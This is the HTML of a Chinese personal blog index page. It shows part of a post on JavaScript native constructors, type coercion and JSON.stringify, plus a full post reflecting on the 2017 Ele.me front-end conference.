class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var c = new Object();</span><br><span class="line">c.foo = &quot;bar&quot;;</span><br><span class="line">c				// &#123;foo:&quot;bar&quot;&#125;</span><br><span class="line">var d = &#123;foo:&quot;bar&quot;&#125;</span><br><span class="line">d				// &#123;foo:&quot;bar&quot;&#125;</span><br><span class="line">var e = new Function(&quot;a&quot;,&quot;return a * 2&quot;);</span><br><span class="line">var f = function(a)&#123;return a*2&#125;;</span><br><span class="line">function g(a)&#123;return a*2&#125;</span><br><span class="line">var h = new RegExp(&quot;^a*b+&quot;,&quot;g&quot;);</span><br><span class="line">var i = /^a*b+/g</span><br></pre></td></tr></table></figure><p></p><p>javascript对常量形式的代码会对他们进行预编译和缓存！</p><h4 id="DATE、ERROR"><a href="#DATE、ERROR" class="headerlink" title="DATE、ERROR"></a>DATE、ERROR</h4><p>相较于其他原生构造函数，Date、Error的用处比其他的更多，因为没有其他对用的常量形式来作为他们的替代<br>引入生成当前时间戳，使用<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Date.now()</span><br><span class="line">// 使用new来生成时间</span><br><span class="line">new Date()</span><br><span class="line">// Thu Jan 04 2018 06:47:59 GMT+0800 (CST)</span><br></pre></td></tr></table></figure><p></p><p>错误对象通常与throw一起使用<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo(x)&#123;</span><br><span class="line">	if(!x)&#123;</span><br><span class="line">		throw new Error(&quot;///&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	// -</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h4 id="SYMBOL"><a href="#SYMBOL" class="headerlink" title="SYMBOL"></a>SYMBOL</h4><p>Symbol可作为私有属性是一种简单标量基本类型</p><h3 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h3><h4 id="抽象值操作"><a href="#抽象值操作" class="headerlink" title="抽象值操作"></a>抽象值操作</h4><p>如果对象有自己的toString()方法，字符串化就会调用该方法并使用其返回值。<br>数组的默认toString方法经过了重新定义<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3]</span><br><span class="line">a.toString()		// &quot;1,2,3&quot;</span><br></pre></td></tr></table></figure><p></p><h4 id="JSON-字符串化"><a href="#JSON-字符串化" class="headerlink" title="JSON 字符串化"></a>JSON 字符串化</h4><p>JSON.stringify(42) // “42”<br>JSON.stringify(“42”) // “”42””<br>JSON.stringify(null) // “null”<br>JSON.stringify(true) // “true”</p><p><em>JSON.stringify()在对象中遇到undefined、function和symbol时会自动将其忽略，在数组中则会返回null</em><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JSON.stringify(undefined)			// undefined</span><br><span class="line">JSON.stringify(function()&#123;&#125;)	// undefined</span><br><span class="line">JSON.stringify([1,undefined, function()&#123;&#125;,4])	// &quot;[1,null,null,4]&quot;</span><br><span class="line">JSON.stringify(&#123;a:2, b: function()&#123;&#125;&#125;)				// &quot;&#123;&quot;a&quot;:2&#125;&quot;</span><br></pre></td></tr></table></figure><p></p><p>循环引用会出错<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;&#125;;</span><br><span class="line">var a = &#123;</span><br><span class="line">	b:42,</span><br><span class="line">	c:o,</span><br><span class="line">	d:function()&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">o.e = a</span><br><span class="line">JSON.stringify(a)</span><br><span class="line">a.toJSON=function()&#123;</span><br><span class="line">	return &#123;b:this.b&#125;</span><br><span class="line">&#125;</span><br><span class="line">JSON.stringify(a)</span><br><span class="line"># Uncaught TypeError: Converting circular structure to JSON</span><br><span class="line">#     at JSON.stringify (&lt;anonymous&gt;)</span><br><span class="line">#     at &lt;anonymous&gt;:8:6</span><br></pre></td></tr></table></figure><p></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/随笔/2017-ele-Interecommunions/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/随笔/2017-ele-Interecommunions/" itemprop="url">2017饿了么前端交流会</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-06T21:07:35+08:00">2017-11-06</time></span></div></header><div class="post-body" itemprop="articleBody"><h4 id="几个演讲"><a href="#几个演讲" class="headerlink" title="几个演讲"></a>几个演讲</h4><p>从h5的埋雷到ServerLess，确实有很多收获。<br>从h5里面，不仅得到了关于页面优化的一些方案，也触及到了一些解决方案。发现h5有很多东西值得深究，有页面调试的一些优化等等。例如：从sticky到z-index实在有太多的学问了。而在工具方面，发现chrome的调试工具是在是太强大了，以前一直没有用过的memery和apperance等等，都有了新的认识。发现页面优化不仅仅是想象的那么简单。从小东西上入手，发现有很多的学问。是在是可以多学。层的探讨、强制同步布局、visibility、￥和&amp;yen,以及dom的一步步呈现。感觉自己学的尚浅，有许多东西可以去学习。<br>从第三方服务上也学到许多，vue的地图篇，地图的实现以及地图api的调用以及api的设计，等等。对vue的深度似乎多了那么一些，总感觉自己学的东西都特别浅，没有能直接做的，对这一块还是得加深学习。<br>当然还有页面编辑可视化的一些小理解。可以通过直接编译组建，上传到服务器，然后服务器直接加到代码中，就可以不用cv代码，直接到里面去修改了。页面编辑其实就将页面上的东西图片生成一个json，让后到服务器中再呈现。而各个小组件是直接编译也好或者源代码也好，上传到服务器后，服务器上有一个gulp或者webpack，直接将其打包，编译，出现页面。这样就可以直接在本地做小组件，然后上传到服务器，服务器直接将其打包之后，就可以直接生成新的页面了。<br>还有用户体验。在用户体验上，发现确实有很多东西需要去深入。比如用户体验的的最终目的，用户体验的原始需求，去发觉里面的各个种种原始目的、需求去解决问题。这样能快速的从用户的角度去看事情的原委。当然，这个产品针对人群也要去探讨，是不是要更改是从目的人群去发掘的。<br>再就是vue和typescript。之前一直不愿意去接触typescript，很大的一个原因是因为自己喜欢原生的东西，喜欢纯粹的东西，所以不愿意，或者说去排斥typescript。这次无疑是打开了我对typescript的一扇门，因为typescript确实设计的很好，一些东西确实可以去深究。而typescript和vue也开始慢慢融合了，在vue的2.5版本里面是typescript的一个上升期，vue对typescript的支持，也可以更优雅的写vue了。所以对typescript也没有了之前的排斥，而是对它开始慢慢接受了。<br>最后的东西就是serverless，serverless是一个很强的东西，虽然我之前没有了解过，唯一了解是通过这次开发者大会上。但是serverless从前辈的介绍上，他确实可以减少很多运维和后端的一些成本，从而快速开发。现在这个时代就是一个快速开发的时代，所以对serverless的前景，肯定是光明的。所以开始使用serverless是一个不错的选择。<br><img src="/img/loading.gif" data-original="/随笔/2017-ele-Interecommunions/eleTalking.jpg" alt="ele-taking"></p><h4 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h4><p>在这次前端开发者大会上，确实有很多收获，从打开一扇新技术的大门，到很多新型技术上的接触。从一些排斥，到一些闪光点的发觉。慢慢发现还有很多事情应该去深究的。当然这是技术上的发觉。还有是在上海这个地方，或者说人生观的觉悟。上海这个地方是一个神奇的地方，他是金融中心，也是很多人的发源地。可以有很多机会让你一夜暴富。但是相同的，他太多的泡沫。很多人都是很疲惫的生活着，没有自己的梦想，在一个大城市的打磨之下，变成了这个大城市运作的一个个小零件。对这件事情之上，有很深的体会。路上的人看起来没有那么慈眉善目，也没有很多的暖，只是冷冷的互相看着手机。可能我是不适合上海这个城市吧。对于这种束缚力过强的地方，不如在小城市来的实在。</p><h4 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h4><p>此次饿了么活动是子健学长和成成学长两个人推荐去的。在去的途中，子健学长和成成学长对我们非常照顾，不仅定房间和吃饭问题，在此次大会上也交流了许多技术，学到了很多。女神也对我们十分照顾，请我们大吃一顿，聊了很久，对于上海这个城市有了新的认识。在此次饿了么之旅发现了许多新技术，以及之前没有涉及到的领域，也从各个大牛手上获取了一手的咨询。不论是对自己，还是对家园，都有了新的认识，新的期许。</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article></section><nav class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a></nav></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span> <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span> <span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><section class="site-overview-wrap sidebar-panel sidebar-panel-active"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" src="/img/logo-gray.jpg" alt="gdccwxx"><p class="site-author-name" itemprop="name">gdccwxx</p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">35</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/index.html"><span class="site-state-item-count">14</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/gdccwxx" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a> </span><span class="links-of-author-item"><a href="mailto:765553928@qq.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-envelope"></i>E-Mail</a></span></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2021</span> <span class="with-love"><i class="fa fa-user"></i> </span><span class="author" itemprop="copyrightHolder">gdccwxx</span></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script><script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script><script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script><script type="text/javascript">var isfetched=!1,isXml=!0,search_path="search.xml";0===search_path.length?search_path="search.xml":/json$/i.test(search_path)&&(isXml=!1);var path="/"+search_path,onPopupClose=function(t){$(".popup").hide(),$("#local-search-input").val(""),$(".search-result-list").remove(),$("#no-result").remove(),$(".local-search-pop-overlay").remove(),$("body").css("overflow","")};function proceedsearch(){$("body").append('<div class="search-popup-overlay local-search-pop-overlay"></div>').css("overflow","hidden"),$(".search-popup-overlay").click(onPopupClose),$(".popup").toggle();var t=$("#local-search-input");t.attr("autocapitalize","none"),t.attr("autocorrect","off"),t.focus()}var searchFunc=function(t,e,s){"use strict";$("body").append('<div class="search-popup-overlay local-search-pop-overlay"><div id="search-loading-icon"><i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i></div></div>').css("overflow","hidden"),$("#search-loading-icon").css("margin","20% auto 0 auto").css("text-align","center"),$.ajax({url:t,dataType:isXml?"xml":"json",async:!0,success:function(t){isfetched=!0,$(".popup").detach().appendTo(".header-inner");var o=isXml?$("entry",t).map(function(){return{title:$("title",this).text(),content:$("content",this).text(),url:$("url",this).text()}}).get():t,n=document.getElementById(e),r=document.getElementById(s),t=function(){var m=n.value.trim().toLowerCase(),x=m.split(/[\s\-]+/);1<x.length&&x.push(m);var e,w=[];0<m.length&&o.forEach(function(t){var e=!1,o=0,h=0,n=t.title.trim(),r=n.toLowerCase(),s=t.content.trim().replace(/<[^>]+>/g,""),a=s.toLowerCase(),i=decodeURIComponent(t.url),c=[],l=[];if(""!=n&&(x.forEach(function(t){function e(t,e,o){var n=t.length;if(0===n)return[];var r,s=0,a=[];for(o||(e=e.toLowerCase(),t=t.toLowerCase());-1<(r=e.indexOf(t,s));)a.push({position:r,word:t}),s=r+n;return a}c=c.concat(e(t,r,!1)),l=l.concat(e(t,a,!1))}),(0<c.length||0<l.length)&&(e=!0,o=c.length+l.length)),e){function p(t,e,o,n){for(var r=n[n.length-1],s=r.position,a=r.word,i=[],c=0;s+a.length<=o&&0!=n.length;){a===m&&c++,i.push({position:s,length:a.length});var l=s+a.length;for(n.pop();0!=n.length&&(s=(r=n[n.length-1]).position,a=r.word,s<l);)n.pop()}return h+=c,{hits:i,start:e,end:o,searchTextCount:c}}[c,l].forEach(function(t){t.sort(function(t,e){return e.position!==t.position?e.position-t.position:t.word.length-e.word.length})});t=[];0!=c.length&&t.push(p(0,0,n.length,c));for(var u=[];0!=l.length;){var f=l[l.length-1],d=f.position,g=f.word,v=d-20,f=d+80;v<0&&(v=0),(f=f<d+g.length?d+g.length:f)>s.length&&(f=s.length),u.push(p(0,v,f,l))}u.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hits.length!==e.hits.length?e.hits.length-t.hits.length:t.start-e.start});e=parseInt("1");function $(o,t){var n="",r=t.start;return t.hits.forEach(function(t){n+=o.substring(r,t.position);var e=t.position+t.length;n+='<b class="search-keyword">'+o.substring(t.position,e)+"</b>",r=e}),n+=o.substring(r,t.end)}0<=e&&(u=u.slice(0,e));var C="";0!=t.length?C+="<li><a href='"+i+"' class='search-result-title'>"+$(n,t[0])+"</a>":C+="<li><a href='"+i+"' class='search-result-title'>"+n+"</a>",u.forEach(function(t){C+="<a href='"+i+'\'><p class="search-result">'+$(s,t)+"...</p></a>"}),C+="</li>",w.push({item:C,searchTextCount:h,hitCount:o,id:w.length})}}),1===x.length&&""===x[0]?r.innerHTML='<div id="no-result"><i class="fa fa-search fa-5x" /></div>':0===w.length?r.innerHTML='<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>':(w.sort(function(t,e){return t.searchTextCount!==e.searchTextCount?e.searchTextCount-t.searchTextCount:t.hitCount!==e.hitCount?e.hitCount-t.hitCount:e.id-t.id}),e='<ul class="search-result-list">',w.forEach(function(t){e+=t.item}),e+="</ul>",r.innerHTML=e)};n.addEventListener("input",t),$(".local-search-pop-overlay").remove(),$("body").css("overflow",""),proceedsearch()}})};$(".popup-trigger").click(function(t){t.stopPropagation(),!1===isfetched?searchFunc(path,"local-search-input","local-search-result"):proceedsearch()}),$(".popup-btn-close").click(onPopupClose),$(".popup").click(function(t){t.stopPropagation()}),$(document).on("keyup",function(t){27===t.which&&$(".search-popup").is(":visible")&&onPopupClose()})</script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(t,e)}()</script><script type="text/javascript" src="/js/src/exturl.js?v=5.1.4"></script><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>